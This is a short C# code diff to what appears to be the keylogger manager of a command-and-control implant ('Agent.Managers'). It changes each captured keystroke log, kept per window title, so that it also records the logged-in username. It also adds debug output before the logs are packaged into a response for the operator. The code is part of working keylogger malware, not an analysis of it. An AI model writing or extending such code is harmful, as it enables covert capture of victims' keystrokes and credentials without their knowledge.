@@ -40,7 +40,7 @@ namespace Agent.Managers
                 klLogs.Add(window_title, new Keylogs()
                 {
                     window_title = window_title,
-                    user = String.Empty,
+                    user = Environment.UserName,
                     builder = new StringBuilder()
                 });
             }
@@ -154,7 +154,7 @@ namespace Agent.Managers
             List<string> returnResults = new List<string>(this.responseStrings);
             this.responseStrings.Clear();
 
-            if (!String.IsNullOrEmpty(klTask) && klLogs.Count > 0)
+            if (!string.IsNullOrEmpty(klTask) && klLogs.Count > 0)
             {
                 KeystrokesResponseResult krr = new KeystrokesResponseResult
                 {
@@ -163,7 +163,8 @@ namespace Agent.Managers
                 };
 
                 krr.Prepare();
-
+                Console.WriteLine("Adding Keylogger Results");
+                Console.WriteLine(krr.keylogs.Count());
                 returnResults.Add(krr.ToJson());
                 klLogs.Clear();
             }
